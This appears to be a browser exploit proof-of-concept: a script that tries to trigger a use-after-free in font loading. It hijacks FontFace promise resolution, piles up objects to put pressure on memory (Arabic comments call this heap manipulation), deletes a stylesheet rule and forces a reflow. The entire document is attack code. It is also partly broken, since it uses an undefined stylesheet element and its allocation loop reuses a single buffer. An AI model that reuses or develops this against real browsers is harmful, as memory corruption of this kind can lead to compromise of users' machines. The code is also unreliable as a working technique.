    <script>
        const logBox = document.getElementById('console');
        function debug(msg) {
            logBox.innerHTML += `<div>[${performance.now().toFixed(2)}ms] ${msg}</div>`;
            logBox.scrollTop = logBox.scrollHeight;
        }

        window.onload = () => {
            debug("System Initialized. Starting PoC...");

            let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
            document.fonts.add(A);
            void A.loaded;

            let fired = false;
            Object.defineProperty(FontFace.prototype, 'then', {
                configurable: true,
                get() {
                    if (!fired && this === A) {
                        fired = true;
                        debug("!!! TRAP HIT: Memory corruption initiated !!!");
                        
                        // محاولة تضخيم الذاكرة لإزاحة الكائنات (Heap Manipulation)
                        new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
                        new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
                        
                        debug("Executing Rule Deletion...");
                        // محاولة إجبار المحرك على إعادة ترتيب الذاكرة (Memory Pressure)
let junk = new Array(1000).fill(new Uint8Array(0x10000));

                        setTimeout(() => { document.getElementById('s').sheet.deleteRule(0); }, 50);

                        
                        debug("Triggering Reflow...");
                        document.body.offsetTop;
                        
                        debug("UAF Sequence completed.");
                    }
                    return undefined;
                }
            });

            debug("Loading font 'x'...");
            document.fonts.load('1em x', 'AB').then(() => {
                debug("Load Success.");
            }).catch((e) => {
                debug("Load Rejected: " + e.message);
            });
        };
    </script>
